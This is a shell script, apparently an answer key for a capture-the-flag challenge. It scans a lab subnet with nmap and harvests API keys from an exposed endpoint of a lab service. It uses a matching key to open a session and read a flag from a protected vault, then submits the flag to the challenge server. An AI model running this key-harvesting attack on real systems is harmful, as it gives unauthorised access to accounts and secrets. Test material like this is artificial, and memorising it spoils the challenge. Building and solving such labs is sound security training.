#!/bin/sh
set -eu

HOST=172.20.0.141
nmap -n -p 8080 --open 172.20.0.141-199 >/dev/null

FLAG="$(python3 - <<'PY'
import json
import urllib.request

base = "http://172.20.0.141:8080"
def get(path):
    with urllib.request.urlopen(base + path, timeout=5) as response:
        return json.load(response)
def post(path, data):
    request = urllib.request.Request(
        base + path,
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=5) as response:
        return json.load(response)

keys = get("/v1/keys")["keys"]
accounts = {item["account_id"] for item in get("/v1/accounts")["accounts"]}
matched = [item for item in keys if item["account_id"] in accounts]
if len(matched) != 1:
    raise SystemExit("Could not isolate one active account key")
session = post("/v1/session", {"key": matched[0]["key"]})
request = urllib.request.Request(
    base + "/v1/vault",
    headers={"Authorization": "Bearer " + session["token"]},
)
with urllib.request.urlopen(request, timeout=5) as response:
    print(json.load(response)["flag"])
PY
)"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-663bf3\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
